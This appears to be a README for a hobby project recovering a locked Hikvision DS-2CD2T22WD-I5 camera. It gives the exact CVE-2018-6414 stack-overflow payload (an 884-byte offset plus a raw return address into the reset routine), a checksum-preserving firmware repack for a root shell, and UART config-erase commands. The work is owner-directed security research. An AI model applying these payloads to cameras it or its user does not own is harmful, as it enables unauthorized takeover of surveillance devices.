# Recovering a $5 Hikvision DS-2CD2T22WD-I5

## Result

The camera arrived activated with an unknown administrator password, a fixed
address of `192.168.20.207`, and no usable physical reset control. Recovery
succeeded by redirecting CVE-2018-6414 into the firmware's own full-reset
routine. The camera was then activated with a new local credential, switched to
DHCP, upgraded to the newest R6 firmware, and given a verified UID-0 maintenance
shell through a checksum-preserving firmware edit.

| Item | Result |
| --- | --- |
| Model | `DS-2CD2T22WD-I5`, R6 platform |
| Serial | `DS-2CD2T22WD-I520161103BBWR670495764` |
| MAC | `a4:14:37:d1:c1:4f` |
| Original firmware | `V5.5.0 build 170725` |
| Current firmware | `V5.5.82 build 190909` |
| Current address | DHCP lease `10.60.2.77/24` |
| Main stream | H.264, 1920x1080, 30 fps |
| Recovery method | CVE-2018-6414 to the internal full-reset path |
| Newest official R6 firmware found | `V5.5.82 build 190909` |
| Exploit status in newest firmware | Patched; the timestamp copy is bounded |
| Root access | Modified V5.5.82 `initrun.sh`; SSH shell verified UID/GID 0 |
| Latest-firmware reset | `resetParam` live-tested; UART bootloader route identified |

This is a visible-light and near-infrared EXIR camera. It is not a thermal
imager despite the initial surplus-store description.

## Initial state

SADP discovery identified the camera and reported `ResetAbility=false`, which
agreed with the lack of any reset switch or pinhole on the housing and cable.
The camera accepted network connections on TCP ports 80, 554, 8000, 9010, and
9020. Protected HTTP and RTSP resources required the unknown credential.

Several recovery paths were eliminated before touching memory corruption:

- The historical date-and-serial SADP codes were rejected.
- All 15 security-question slots were unset.
- The signed DeviceKey reset flow verifies a PKCS#1 v1.5 RSA signature using a
  built-in public key. Hikvision retains the corresponding private key.
- The encrypted-string reset flow generates a random secret inside the camera
  and sends it under a different built-in RSA public key. Its eight-character
  reset code cannot be reconstructed from the serial, date, verification code,
  or exchange challenge.
- Four monitored power cycles produced no Hikvision recovery handshake, ARP,
  or TFTP request. A handshake-aware recovery server made no difference.
- The security-question setters require the current administrator password.
- CVE-2021-36260 command injection was not present in this build.
- The supplied `V5.6.821` image belongs to the G1 family and is incompatible
  with this R6 device.

The reset-code analysis remains in [password-reset.md](password-reset.md).

## Firmware extraction

The matching official archive was
`IPC_R6_EN_STD_5.5.0_170725.zip`, SHA-256:

```text
b55680bef100072af4d13417c9b46e8da15488abe4adfb196853551746972778
```

The outer `digicap.dav` container was decoded and its `davinci.tar.gz` member
decrypted. `hikio.ko` supplies a static application key through ioctl
`0x8004480f`; `daemon_fsp_app` uses that key to recover the archive password,
then decrypts the payload with AES-256-ECB and the vendor's double-MD5
`EVP_BytesToKey` derivation. The recovered `davinci` executable has SHA-256:

```text
0dc5c3ee5688dc979911bcd60a1e2cc5bce5ad974c59556923869a48fbf37c72
```

The binary is a fixed-address, stripped ARM/Thumb ELF without a stack canary in
the vulnerable request handler.

## The vulnerable request

An unauthenticated request reaches the vulnerable session-login handler:

```text
POST /ISAPI/Security/sessionLogin?timeStamp=<value> HTTP/1.1
Content-Length: 0
```

At `0x24a1e0`, the V5.5.0 handler allocates a `0x384`-byte stack frame and calls
`sscanf` with an unbounded format string:

```text
push.w {r4-r11, lr}
sub.w  sp, sp, #0x384
...
sscanf(query, "timeStamp=%s", sp + 0x30)
...
add.w  sp, sp, #0x384
pop.w  {r4-r11, pc}
```

The timestamp destination is a 16-byte buffer at `sp+0x30`. Saved LR is at
`sp+0x3a4`, giving an exact overwrite distance of:

```text
0x3a4 - 0x30 = 0x374 = 884 bytes
```

This made the saved return address controllable without authentication.

## Turning it into a factory reset

The authenticated factory-reset handler contains a block that already performs
the desired operation:

```text
0x225712  movs r0, #1
0x225714  bl   0x229408
```

The callee validates reset modes 1 and 2 and invokes
`UniNetIF_ResetCFG(1, mode)`. Mode 1 performs a complete reset. Mode 2 restores
the saved user database and would preserve the unknown password.

The required Thumb return value is `0x225713`, encoded little-endian as
`13 57 22 00`. The final request target was therefore:

```text
/ISAPI/Security/sessionLogin?timeStamp=
    + 884 bytes of "A"
    + raw bytes 13 57 22
```

`sscanf` appended the final zero byte. This old Appweb accepted raw byte `0x13`
in the URI. Percent encoding did not decode at this stage; an earlier request
ending in `%13%57%22` merely crashed the process and caused a watchdog reboot.

The successful raw request entered the reset block. Configuration was written
before the corrupted function returned, after which the watchdog restarted the
camera. SADP then reported `Activated=false`, and the camera appeared at the
factory address `192.168.1.64`.

The model-specific sender is
[cve_2018_6414_reset.py](cve_2018_6414_reset.py). It is a dry run unless passed
`--execute`; its addresses and offsets apply only to the exact V5.5.0 binary
identified above.

## Activation and validation

The inactive camera was activated through Hikvision's RSA/AES ISAPI challenge
flow, implemented in [activate_camera.py](activate_camera.py). The replacement credential is kept in ignored
`private/credentials.txt`, mode `0600`, and is not included in version control.
An authenticated request to `/ISAPI/System/deviceInfo` returned HTTP 200.

`/ISAPI/System/Network/interfaces/1/ipAddress` was changed to dynamic
addressing. After reboot, DHCP assigned `10.60.2.77/24` with gateway and DNS
`10.60.2.1`. Authenticated readback confirmed `addressingType=dynamic`.

Media checks completed the recovery:

- `/ISAPI/Streaming/channels/101/picture` returned a valid 1920x1080 JPEG.
- `rtsp://10.60.2.77/Streaming/Channels/101` returned authenticated H.264 video
  at 1920x1080 and 30 fps.
- A fresh snapshot caught the owner's celebratory couch dab.

## Is the latest firmware still vulnerable?

No. This exact overflow is fixed in the newest firmware available from
Hikvision's R6 archive for this model family.

Hikvision's advisory lists the `DS-2CD2X12FWD`, `DS-2CD2X22FWD`,
`DS-2CD2X42FWD`, and `DS-2CD2X52F` families as affected from V5.5.0 through
V5.5.52, and lists `V5.5.53 build 180730` and later as resolved. The official
R6 directory ends at `V5.5.82 build 190909`; its release note explicitly lists
`DS-2CD2T22WD-I3/I5/I8` as supported.

The official V5.5.82 archive has SHA-256:

```text
b9083f8f42cec2d1668991e3cdacb4e77413027dd0291cb6515ef5a80b1d87de
```

Its recovered `davinci` executable has SHA-256:

```text
bc72521cdc2621986af5f9bf454c825c9c35ecf2fd28cdc5d4521fbb0a34ac4a
```

Independent binary inspection confirms the patch. The V5.5.82 handler begins
at `0x271e08`. It still reserves a 16-byte timestamp buffer at `sp+0x30`, but
the `timeStamp=%s` string and unbounded `sscanf` call are absent. The new code:

```text
0x271e94  ldr    r0, [r5, #0x1c]  ; query string
0x271e98  ldr    r1, ="timeStamp="
0x271e9a  blx    strstr
0x271ea0  add.w  r7, r0, #10
0x271ea6  blx    strlen
0x271eaa  movs   r3, #15
0x271eac  movs   r1, #16          ; destination size
0x271eae  cmp    r3, r0
0x271eb4  movhs  r3, r0           ; min(strlen(value), 15)
0x271eb6  add    r0, sp, #0x30
0x271eb8  bl     0x3f7860         ; checked copy
```

The destination is cleared before this block. At most 15 attacker-controlled
bytes reach its 16-byte allocation, so the saved return address cannot be
reached through this parameter. This establishes that the recovery primitive
used here is absent from V5.5.82; it does not make a broader claim that the old
firmware contains no other vulnerabilities.

## Firmware upgrade

On 2026-09-08, the camera was upgraded through the official R6 releases in
ascending order, following Hikvision's legacy firmware guidance:

| Stage | ZIP SHA-256 | `digicap.dav` SHA-256 |
| --- | --- | --- |
| V5.5.5 build 180111 | `6e2cfaf8e80a1e96d6dcbf1e1abb257ca9c264581c4db55543c388edc7dfb0b1` | `1bafd270c8a80e42879291ec43d8dbdd30b3a01d21374acd0bbd3995bd3db8b8` |
| V5.5.53 build 180730 | `997faadc8cf323b078feacdf5436b6e6665dc152c8c348b23c8a6f2a34e400cf` | `0624b2075b60a68cdccac352bfa28e6b1d7556585140229b7a70b40edab054b4` |
| V5.5.82 build 190909 | `b9083f8f42cec2d1668991e3cdacb4e77413027dd0291cb6515ef5a80b1d87de` | `5f28752d62ac6115ab28a64ba37dc00c6fb86c3809b5c64dc201a66c718e2a25` |

Each `digicap.dav` was sent with digest authentication as a binary `PUT` to
`/ISAPI/System/updateFirmware`. The camera reached `Reboot Required` after
each stage, was explicitly rebooted, and reported the expected intermediate
version before the next image was uploaded.

The first V5.5.82 boot preserved the administrator credential and DHCP
configuration. Authenticated device and network queries returned HTTP 200 at
`10.60.2.77`; a snapshot decoded as a 1920x1080 JPEG; and RTSP returned H.264
at 1920x1080 and 30 fps. TCP ports 80, 554, and 8000 remained available.

## Root shell on V5.5.82

The hidden SSH service can be enabled through HCNetSDK security commands 147
and 148 even though this model rejects the corresponding ISAPI operation.
An unmodified login starts `/bin/psh`, whose RSA-protected `debug` command and
allowlist did not yield a general shell.

The R6 HK20/HK30 container was therefore repacked. A same-length `initrun.sh`
edit changes the administrator shell in `/etc/passwd` from `/bin/psh` to
`/bin/sh`. The script checksum stays unchanged through a computed four-byte CRC
compensation in an existing comment, so the encrypted HK30 header does not
change. [repack_root_shell.py](repack_root_shell.py) verifies the original
image, round-trip encryption, payload length, checksum, and final output.

```text
official V5.5.82 digicap.dav  5f28752d62ac6115ab28a64ba37dc00c6fb86c3809b5c64dc201a66c718e2a25
modified root-shell image     56c203de0aa1efd03144d5fa6b2db7736e31aabae2411465fbd874e106c2d1a1
```

The camera accepted the modified image through the normal authenticated
firmware endpoint. After reboot, a fresh administrator SSH login reached
BusyBox `sh`. Since this BusyBox omits `id`, the shell read its credentials
from `/proc/self/status`:

```text
Uid: 0 0 0 0
Gid: 0 0 0 0
```

A write/read/remove test under `/tmp` succeeded. This establishes arbitrary
UID-0 shell access on the owned camera. Full format and rollback details are in
[root-access.md](root-access.md).

## Resetting another locked V5.5.82 unit

The latest firmware's `resetPasswd` maintenance command is inert on this IPC:
it did not alter either config bank or any tested credential. Its sibling
`resetParam` is active. A live test changed the primary config bank; after a
manual reboot the camera was inactive at `192.168.1.64`, and every old or
factory credential returned HTTP 403. Reactivation and DHCP restoration then
succeeded, with the firmware still reporting V5.5.82.

For a unit whose web password is unknown, this camera's dumped bootloader shows
the physical entry point. U-Boot 3.1.6 prints `Hit Ctrl+u to stop autoboot:`,
presents `HKVS #`, and exposes `erase cfg_pri`, `erase cfg_sec`, and `reset`
without a visible authentication gate. Clearing both redundant configuration
banks produces the same inactive state while leaving firmware partitions
alone. The internal 3.3 V TTL connector must first be mapped safely; its pad
order has not been electrically confirmed on this particular unit. See
[password-reset.md](password-reset.md) and [uart.md](uart.md).

## Project artifacts

- [PROGRESS.md](PROGRESS.md): dated journal and current operational state
- [web-overflow.md](web-overflow.md): focused disassembly and exploit notes
- [password-reset.md](password-reset.md): SADP reset protocol analysis
- [root-access.md](root-access.md): V5.5.82 custom firmware and verified UID-0 shell
- [cve_2018_6414_reset.py](cve_2018_6414_reset.py): exact V5.5.0 reset sender
- [decrypt_davinci.py](decrypt_davinci.py): R6 `davinci` archive decryptor
- [repack_root_shell.py](repack_root_shell.py): verified HK20/HK30 root-shell repacker
- [activate_camera.py](activate_camera.py): inactive-camera RSA/AES activation helper
- `captures/`: ignored packet and activation captures
- `firmware/`: ignored official archives and extracted binaries
- `private/`: ignored credentials and reset artifacts

## References

- [Hikvision CVE-2018-6414 advisory](https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification--buffer-overflow-vulnerability-in-some-hik/)
- [Hikvision R6 V5.5.82 archive](https://www.hikvisioneurope.com/eu/portal/?dir=portal%2FTechnical%20Materials%2F00%20%20Network%20Camera%2F00%20%20Product%20Firmware%2FR6%20platform%20%282X22FWD%2C%202X42FWD%2C%202X52%2C64X4FWD%2C1X31%2C1X41%29%2FV5.5.82_Build190909)
- [CVE-2018-6414 record](https://www.cve.org/CVERecord?id=CVE-2018-6414)
- [VDOO technical analysis](https://blogvdoo.wordpress.com/2018/11/13/significant-vulnerability-in-hikvision-cameras/)
